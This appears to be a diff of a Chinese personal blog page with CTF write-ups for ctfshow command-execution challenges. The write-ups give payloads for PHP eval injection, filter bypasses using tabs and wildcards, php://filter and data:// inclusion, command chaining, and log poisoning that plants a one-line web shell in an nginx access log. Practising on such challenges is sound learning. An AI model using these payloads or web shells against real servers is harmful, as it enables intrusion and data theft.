+<h3 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h3><p>用分隔符<code>&amp;&amp;</code><br>但是需要进行<strong>URL编码</strong> 因为在URL中<code>&amp;</code>是参数分隔符<br><code>?c=tac flag.php%26%26 </code><br>拼接后的命令为<code>?c=tac flag.php &amp;&amp; &gt;/dev/null 2&gt;&amp;1</code><br>1.URL解码后得到 <code>tac flag.php&amp;&amp;</code><br>2.<code>&amp;&amp;</code> 是shell命令分隔符<br>3.将重定向隔离到单独的命令<br>4.<code>tac flag.php</code> 的输出不受重定向影响<br><img src="/images/Pastedimage20260805211413.png"><br>去掉末尾空格<code> </code>同样可用<br><img src="/images/Pastedimage20260805211709.png"><br>得到flag</p>
+<h3 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h3><p>用逻辑或<code>||</code><br><code>?c=tac flag.php||</code><br>在功能上起到了分隔命令的作用<br>拼接后的命令为<code>tac flag.php|| &gt;/dev/null 2&gt;&amp;1</code><br>Shell解析为两个命令：<br>命令1:<code>tac flag.php</code><br>命令2: <code>&gt;/dev/null 2&gt;&amp;1</code>（空命令+重定向）<br>命令1成功 则不执行命令2<br><img src="/images/Pastedimage20260805212629.png">得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/06/2026-08-06-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb42/" data-id="cmspupgt400051cuy1desasvp" data-title="ctfshow 命令执行web42" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-05-ctfshow 命令执行web38" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/05/2026-08-05-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb38/" class="article-date">
+  <time class="dt-published" datetime="2026-08-05T00:00:00.000Z" itemprop="datePublished">2026-08-05</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/05/2026-08-05-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb38/">ctfshow 命令执行web38</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web38<br>题目链接(<a target="_blank" rel="noopener" href="https://a37296a5-4457-4656-ac82-046e81b6b0ba.challenge.ctf.show/">https://a37296a5-4457-4656-ac82-046e81b6b0ba.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260804202327.png"><br>正则过滤了flag、php、file不区分大小写 同样是include include读取指定文件的内容，如果内容里有PHP代码标记就执行代码<br>和上一题一样用php伪协议以及base64解码<br>payload:<code>/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br><img src="/images/Pastedimage20260804202729.png"><br>拿到flag</p>
+<p>查看wp发现还有另外一种解法<br>payload:<code>?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;</code><br><code>&lt;?=</code> 是PHP的短输出标签，等于 <code>&lt;?php echo</code> 绕过了对php的过滤<br>在系统命令中，<code>*</code> 是通配符，代表任意字符串  绕过了对flag的过滤<br>通过data伪协议把PHP代码写入到include的参数中，让include执行这段代码<br>通过system函数执行系统命令 <code>tac fla*</code><br>最后拿到flag<br><img src="/images/Pastedimage20260804202447.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web39<br>题目链接(<a target="_blank" rel="noopener" href="https://b1013001-c123-4102-a44c-cfde034263a5.challenge.ctf.show/">b1013001-c123-4102-a44c-cfde034263a5.challenge.ctf.show</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260804203827.png"><br>传值给c，include包含对应的文件并加上.php后缀 同时通过正则检测c参数里有没有”flag”字符串 不区分大小写<br><code>?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;</code><br><img src="/images/Pastedimage20260804205604.png"><br>拿到flag<br>解析：传的是 <code>?c=data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;</code><br>include接收到的实际字符串是<code> data://text/plain,&lt;?=system(&quot;tac fla*&quot;)?&gt;.php</code><br>include看到这个字符串以data:&#x2F;&#x2F;开头，就会调用data协议处理器。data协议处理器会从字符串开头开始解析，它会识别出<code>data://text/plain,</code>这个部分，然后把逗号后面的内容提取出来作为数据内容。数据内容后面跟着的 .php，它会被当作数据内容的一部分，而不是作为文件名后缀。<br><strong>重点</strong>:.php 在 ?&gt; 结束标签的后面，它不在PHP代码块内，会被当作普通文本输出。虽然会有多余的 .php 输出，但不影响system命令的执行，因为 <code>system(&quot;tac fla*&quot;)</code> 这部分代码是完整的，已经执行了</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web40<br>题目链接(<a target="_blank" rel="noopener" href="https://997c5646-694b-4663-a355-7c785865c4b7.challenge.ctf.show/">https://997c5646-694b-4663-a355-7c785865c4b7.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260805101227.png"><br>正则过滤了所有数字 <code>0-9</code> 大部分特殊符号：<code>~`@#$%^&amp;*()-=+&#123;&#125;[]:&#39;&#39;&quot; ,&lt;.&gt;/?</code> 反斜杠 <code>\</code> 和中文括号 <code>（）</code><br><strong>关键点</strong>：正则只检查 <code>$_GET[&#39;c&#39;]</code>，不检查其他参数，所以引入<code>cmd</code> 参数携带恶意代码</p>
+<p><code>?cmd=system(&quot;tac flag.php&quot;);&amp;c=eval(pos(pos(get_defined_vars())));</code></p>
+<p><code>c=eval(pos(pos(get_defined_vars())));</code><br>第一层<code>get_defined_vars()</code>获取当前作用域所有已定义变量的数组<br>       返回的数组保持变量定义的顺序，所以先注册的变量排在前面 <code>_GET</code> 最先注册，排在第一个<br>第二层<code>os(get_defined_vars())</code>返回数组的当前元素（默认是第一个元素）<br>第三层<code>pos(pos(get_defined_vars()))</code>获取第一个数组的第一个元素<br>第四层<code>eval(pos(pos(get_defined_vars())))</code>将获取到的字符串作为PHP代码执行</p>
+<p>总体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET = [</span><br><span class="line">    &#x27;cmd&#x27; =&gt; &#x27;system(&quot;tac flag.php&quot;);&#x27;,</span><br><span class="line">    &#x27;c&#x27; =&gt; &#x27;eval(pos(pos(get_defined_vars())));&#x27;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+<p>2.外层 <code>eval()</code> 启动执行链<br>3.<code>get_defined_vars()</code> 获取所有变量<br>4.第一次 返回数组第一个元素 <code>pos()</code> 取 <code>$_GET</code><br>5.第二次 返回第一个元素 <code>pos()</code> 取 <code>$_GET[&#39;cmd&#39;]</code><br>6.内层 <code>eval()</code> 执行恶意代码 <code>eval(&#39;system(&quot;tac flag.php&quot;);&#39;);</code><br>7.解析字符串为PHP代码，<code>system()</code> 调用操作系统Shell 执行系统命令<br>8.读取 <code>flag.php</code><br><strong>注意</strong>：第4步：第一次 pos()操作对象是<code>get_defined_vars()</code> 的返回值<br>      第5步：第二次 pos()操作对象是第一次 <code>pos()</code> 的返回值<br><img src="/images/Pastedimage20260805102212.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/05/2026-08-05-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb38/" data-id="cmspupgt100011cuy64r0ew1l" data-title="ctfshow 命令执行web38" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-04-ctfshow 命令执行web33" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" class="article-date">
+  <time class="dt-published" datetime="2026-08-04T00:00:00.000Z" itemprop="datePublished">2026-08-04</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/">ctfshow 命令执行web33</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web33<br>题目链接(<a target="_blank" rel="noopener" href="https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/">https://d3626d15-ce3b-4230-a644-152156e284d3.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803120502.png"><br>正则过滤了flag  system  php  cat  sort  shell  点号  空格  单引号  反引号  echo  分号  左括号  双引号<br>和上一题一样文件包含加日志注入</p>
+<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><code>/?c=include%09$_GET[0]?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;]</code> &#x3D; <code>&#39;include%09$_GET[0]?&gt;&#39;</code><br>    <code>$_GET[0]</code> &#x3D; <code>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 flag.php   <code>include &#39;flag.php&#39;;</code><br>4.执行<code>include &#39;flag.php&#39;;</code><br><img src="/images/Pastedimage20260803114957.png"><br>base64解码<br><img src="/images/Pastedimage20260803115023.png"></p>
+<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803124048.png"><br>先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</code><br>整体执行过程<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[0]?&gt;&#39;;</code><br>    <code>$_GET[0] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包 将一句话木马写入UA<br><img src="/images/Pastedimage20260803120246.png"><br>蚁剑连接 得到flag<br><img src="/images/Pastedimage20260803120103.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web36<br>题目链接(<a target="_blank" rel="noopener" href="https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/">https://861d637f-10bf-4798-9832-b206780f0a1c.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机</p>
+<p><img src="/images/Pastedimage20260803122036.png"><br>在上一题的基础上 这里正则额外过滤了数字1-9</p>
+<h3 id="法1-1"><a href="#法1-1" class="headerlink" title="法1"></a>法1</h3><p>所以要在之前payload的基础上 将1修改为a<br>即<code>/?c=include%09$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code><br><img src="/images/Pastedimage20260803122212.png"><br>解码<br><img src="/images/Pastedimage20260803122240.png"></p>
+<h3 id="法2-1"><a href="#法2-1" class="headerlink" title="法2"></a>法2</h3><p><img src="/images/Pastedimage20260803123456.png"><br>还是先抓包发现是nginx服务器 默认的access日志路径为<code>/var/log/nginx/access.log</code>access<br>payload:<code>/?c=include%09$_GET[a]?&gt;&amp;a=/var/log/nginx/access.log</code><br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[a]?&gt;&#39;;</code><br>    <code>$_GET[a] = &#39;/var/log/nginx/access.log&#39;;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[a]?&gt;&#39;);</code><br>3.<code>$_GET[a]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>抓包并将UA修改为一句话木马<br><img src="/images/Pastedimage20260803123101.png"><br>蚁剑连接<br><img src="/images/Pastedimage20260803123216.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web37<br>题目链接(<a target="_blank" rel="noopener" href="https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/">https://6978e87d-3d7f-4834-a227-a3520b13f37b.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260803125814.png"><br>正则过滤了flag不区分大小写<br>首先尝试<br><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code><br>没有响应<br>原因是：代码里没有任何eval，传进去的<code>include%0aGET[1]?&gt;</code>会被当作文件名来处理，而不是作为代码执行<br><strong>区别</strong><br><code>eval(c)</code>意思是把c参数的内容当作PHP代码来执行<br><code>include(c)</code>意思是把c参数的内容当作文件名来处理</p>
+<p>使用PHP伪协议<br>已知：<code>&lt;?php</code>表示开始PHP解析 <code>?&gt;</code>表示结束PHP解析 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>在include包含时，被包含内容的PHP代码会被执行<br>所以读取flag文件的payload为：<code>data://text/plain,&lt;?php system(&quot;tac flag.php&quot;) ?&gt;</code><br>第一部分是协议头：data:&#x2F;&#x2F;  这是PHP的data伪协议标识，可以在字符串中嵌入数据，让文件函数读取这段字符串，告诉include要用data协议来处理后面的内容<br>第二部分是媒体类型：text&#x2F;plain  表示后面的数据是纯文本格式，告诉PHP如何解析这个数据流<br>第三部分是逗号  这是分隔符，用来分隔协议参数和实际数据内容<br>第四部分 <code>&lt;?php system(&quot;tac flag.php&quot;) ?&gt; </code>这是实际的数据内容，也就是要执行的PHP代码<br>但是由于flag被过滤 所以加一层base64编码<br><img src="/images/Pastedimage20260803132332.png"><br><code>/?c=data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>区别在于明文版本用逗号直接分隔，后面的内容原样传递<br>base64版本多了 <code>;base64</code>这个参数，告诉PHP后面的数据需要先base64解码再使用<br><img src="/images/Pastedimage20260803132656.png"><br>得到flag</p>
+<p>整个执行过程是绕过flag字符的过滤之后 PHP执行 include($c)，也就是 <code>include(&quot;data://text/plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=&quot;)</code><br>include函数看到这个路径是以data:&#x2F;&#x2F;开头，就调用PHP的data协议处理器来处理这个路径<br>识别出协议类型是data   媒体类型是text&#x2F;plain  编码方式是base64<br>提取出要解码的数据是 <code>PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4=</code><br>data协议处理器把解码后的内容返回给include函数<br>include函数拿到这个内容后，发现是PHP代码，就开始执行它<br>system函数向操作系统shell发送命令 <code>&quot;tac flag.php&quot;</code><br>tac命令把读取到的flag.php内容返回给system函数<br>system函数把命令的输出直接打印到HTTP响应中</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/04/2026-08-04-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb33/" data-id="cmspupgt400061cuybzb3c1l4" data-title="ctfshow 命令执行web33" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-07-26-Untitled" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/07/26/2026-07-26-Untitled/" class="article-date">
+  <time class="dt-published" datetime="2026-07-26T00:00:00.000Z" itemprop="datePublished">2026-07-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/07/26/2026-07-26-Untitled/">Untitled</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="/images/Pastedimage20260726104237.png"><br>要求GET传参传入参数c 正则匹配过滤了flag system php cat sort shell 点号、空格、单引号、双引号、反引号、分号和左括号<br>构造payload:<code>/?c=include%09&quot;/fla*&quot;?&gt;</code><br>因为左括号被禁用 所以尝试文件包含 避开括号 语法include 文件名;<br>因为空格被禁用 所以用tab键的url编码 %09<br>因为分号被禁用 所以用 <code>?&gt;</code>来结束当前的PHP语句<br><img src="/images/Pastedimage20260726102936.png"><br>但是行不通 问题出在通配符 include是PHP的语言结构 不是Shell命令 即PHP的文件操作函数不支持通配符 它们只接受具体的文件路径</p>
+<h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>使用文件包含的同时加上php伪协议<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=php://filter/convert.base64-encode/resource=flag.php</code><br><code>$_GET</code> 是一个数组，内容是URL 中所有GET参数组成的键值对<br><code>[0]</code> 表示键名为 <code>0</code> 的数组元素<br><strong>注意:<code>$_GET</code>是关联数组  所以<code>[0]</code>只是键名为<code>0</code>的元素，与位置无关，区别于索引数组</strong><br>并且数字键名不需要引号 整体实现了获取URL中参数 <code>0</code> 的值 避免使用引号<br><code>?&gt;</code>PHP结束标签<br><code>&amp;</code> 分隔多个GET参数 即<code>c</code>和<code>0</code><br><code>0=</code> 定义参数名为 <code>0</code> 对应PHP中的 <code>$_GET[0]</code></p>
+<p><code>php://filter/convert.base64-encode/resource=</code>这是PHP伪协议 读取文件内容并以Base64编码输出<br>拆解:<br><code>php://</code>PHP 内置的伪协议<br><code>filter</code>表示使用过滤器功能<br><code>/convert.base64-encode</code>过滤器名称 作用：把文件内容转换为 Base64 编码<br><code>/resource=</code>指定要处理的文件路径</p>
+<p>整体执行逻辑：<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;]</code> &#x3D; <code>&#39;include%09$_GET[0]?&gt;&#39;</code><br>    <code>$_GET[0]</code> &#x3D; <code>&#39;php://filter/convert.base64-encode/resource=flag.php&#39;</code><br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 flag.php   <code>include &#39;flag.php&#39;;  4.执行</code>include ‘flag.php’;&#96;<br><img src="/images/Pastedimage20260726111411.png">解码得到flag<br><img src="/images/Pastedimage20260726104818.png"><br>这是已知flag位置的前提下 可以使用这个方法</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>如果在不知道flag的位置的前提下 需要使用文件包含+日志注入的方式<br>判断是否能日志注入：尝试包含日志文件看是否能读取内容<br>首先抓包看看 得到服务器为nginx<br><img src="/images/Pastedimage20260726173239.png"><br><code>/var/log/nginx/access.log</code>是<code>nginx</code>默认的access日志路径<br>所以和上一个payload的大体格式一样构造，只是将静态的读取文件变成了动态的包含日志，执行其中的PHP代码<br><code>/?c=include%09$_GET[0]?&gt;&amp;0=/var/log/nginx/access.log</code><br><img src="/images/Pastedimage20260726173937.png"><br>这个payload的执行过程如下：<br>1.PHP将URL中的参数解析成 <code>$_GET</code> 数组<br>    <code>$_GET[&#39;c&#39;] = &#39;include%09$_GET[0]?&gt;&#39;;     </code>$_GET[0] &#x3D; ‘&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log’;<br> 2.<code>eval()</code> 执行 <code>c</code> 参数的内容<br>     <code>eval(&#39;include%09$_GET[0]?&gt;&#39;);</code><br>3.<code>$_GET[0]</code> 被替换成 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log   <code>include &#39;/var/log/nginx/access.log&#39;;</code><br>4.执行<code>include &#39;/var/log/nginx/access.log&#39;;</code><br>整个过程纯文本输出，没有任何PHP代码被执行<br>返回包里面包含了所有的攻击尝试记录 说明<code>include</code> 成功执行 日志文件被包含</p>
+<p>下一步修改UA把一句话木马存进服务器的日志文件里，然后通过包含日志文件来执行代码<br>一句话木马<code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code><br>写一句话木马的作用:<br>凡是从POST参数里传入 <code>cmd</code> ，都把它当成PHP代码执行，然后把结果返回<br>选择修改UA的原因：<br>1.Nginx默认记录每个请求的UA到访问日志<br>2.UA内容完全可控<br>3.UA内容不会被过滤<br><img src="/images/Pastedimage20260726173916.png"><br>写入后用蚁剑连接(蚁剑自动化、图形化、批量化地完成POST传参过程)<br>注意：HTTPS可能有证书验证问题或端口限制 所以一开始用https连接失败 改成http才可以<br><img src="/images/Pastedimage20260726173903.png"><br>得到flag<br><img src="/images/Pastedimage20260726172437.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/07/26/2026-07-26-Untitled/" data-id="cmspupgt300021cuy2j8e2rav" data-title="Untitled" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-07-25-ctfshow 命令执行web29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/07/25/2026-07-25-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29/" class="article-date">
+  <time class="dt-published" datetime="2026-07-25T00:00:00.000Z" itemprop="datePublished">2026-07-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/07/25/2026-07-25-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29/">ctfshow 命令执行web29</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web29<br>题目链接()<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260725084332.png"><br>题目重点是通过GET传参传入一个参数c 如果c不是flag(因为i 即不区分大小写) 即可执行参数c<br><code>eval($c);</code>把字符串当作 PHP 代码来执行 所以给c传参时要用到php内置函数 最简单的用system即可 先查看文件目录<code>/?c=system(&quot;ls&quot;);</code>看看system函数是否可以被正常执行<br><strong>注意：这里最后要加<code>;</code> 不然命令无法被正常执行</strong><br><img src="/images/Pastedimage20260725083845.png"><br>得到文件名 说明system函数可以用 下一步要想办法绕过题目通过正则匹配对flag(因为i 不区分大小写）的过滤 直接用通配符绕过<br>通配符绕过原理：<br>1.<code>preg_match()</code> 检查的是 字符串本身 不会去执行它<br>2.系统 Shell接收到这个命令后：扫描当前目录 找到匹配 <code>fla*</code> 的文件<br>所以先尝试<code>/?c=system(&quot;cat fla*&quot;);</code><br><img src="/images/Pastedimage20260725085703.png"><br>猜测是cat被绕过 换成tac试试<br><img src="/images/Pastedimage20260725085755.png"><br>拿到flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web30<br>题目链接(<a target="_blank" rel="noopener" href="https://e99e821d-ed77-4aa6-9272-277876df945c.challenge.ctf.show/">e99e821d-ed77-4aa6-9272-277876df945c.challenge.ctf.show</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260725090919.png"><br>这个题目同样要求GET传参传入参数c 但是正字匹配过滤flag的同时过滤了system和php(不区分大小写)<br>system()用passthru()代替<br>同样先用ls命令测试一下passthru()函数是否可用<br><code>/?c=passthru(&quot;ls&quot;);</code><br><img src="/images/Pastedimage20260725091411.png"><br>&#x2F;?c&#x3D;passthru(“tac fla*”);<br><img src="/images/Pastedimage20260725091950.png"><br>拿到flag<br>看了一下wp 发现还有其他代替system的方法 直接<code>echo&#39;&#39;;</code><br>原理：反引号 <code>`</code> 是 PHP 的执行运算 <code>/?c=echo tac fla*</code>;<code>eval(&quot;echo</code>tac fla*&#96;;”);直接执行命令<br><img src="/images/Pastedimage20260725092620.png"></p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web31<br>题目链接(<a target="_blank" rel="noopener" href="https://b788040e-8b39-42d4-a730-f4d3c0101f5c.challenge.ctf.show/">https://b788040e-8b39-42d4-a730-f4d3c0101f5c.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260725093602.png"><br>这个题目还是要求GET传参传入参数c 但是正字匹配过滤flag的同时过滤了system php cat sort shell(不区分大小写) 以及.空格 单引号<br>所以echo’’;不可以用<br>对空格进行url编码<br><code>/?c=passthru(&quot;tac fla*&quot;);</code><br><img src="/images/Pastedimage20260725093242.png"><br>无法绕过 原因<code> </code> 解码后就是空格字符 空格被过滤了 所以 <code> </code> 不行<br>换一个思路 用Tab键绕过 url编码为%09<br><code>/?c=passthru(&quot;tac%09fla*&quot;);</code><br><img src="/images/Pastedimage20260725094147.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/07/25/2026-07-25-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb29/" data-id="cmspupgsz00001cuy59n3bkx9" data-title="ctfshow 命令执行web29" class="article-share-link"><span class="fa fa-share">分享</span></a>
       
       
       
@@ -123,6 +550,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
+  </nav>
 
 </section>
         
@@ -140,7 +572,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/08/">八月 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/07/">七月 2026</a></li></ul>
     </div>
   </div>
 
@@ -154,6 +586,22 @@
         
           <li>
             <a href="/2026/08/12/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+          </li>
+        
+          <li>
+            <a href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/">ctfshow 命令执行web44</a>
           </li>
         
       </ul>
